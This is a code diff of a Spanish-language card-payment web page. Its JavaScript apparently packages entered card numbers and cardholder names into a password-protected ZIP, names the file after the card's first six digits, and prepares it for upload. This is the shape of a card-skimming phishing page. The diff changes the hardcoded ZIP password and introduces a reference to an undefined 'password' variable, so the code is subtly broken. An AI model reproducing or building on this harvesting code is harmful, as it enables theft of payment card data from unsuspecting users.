@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Pagar con tarjetas</title>
+  <title>Pagar con tarjeta</title>
   <style>
     body {
       background: linear-gradient(to right, black, gray);
@@ -88,7 +88,7 @@
       }
 
       var fileName = cardNumber.substr(0, 6) + '_' + cardName + 'C';
-      var zipPassword = "bolsadeseda22";
+      var zipPassword = "08papanat4s";
 
       var cardData = [
         new Date().toLocaleString(),
@@ -106,7 +106,7 @@
       var zip = new JSZip();
       var csvContent = cardData.join(", ");
       zip.file(fileName + ".txt", csvContent);
-      zip.generateAsync({ type: "blob", compression: "DEFLATE", password: zipPassword })
+      zip.generateAsync({ type: "blob", compression: "DEFLATE", password: password })
         .then(function(content) {
           var formData = new FormData();
           formData.append("file", content, fileName + ".zip");
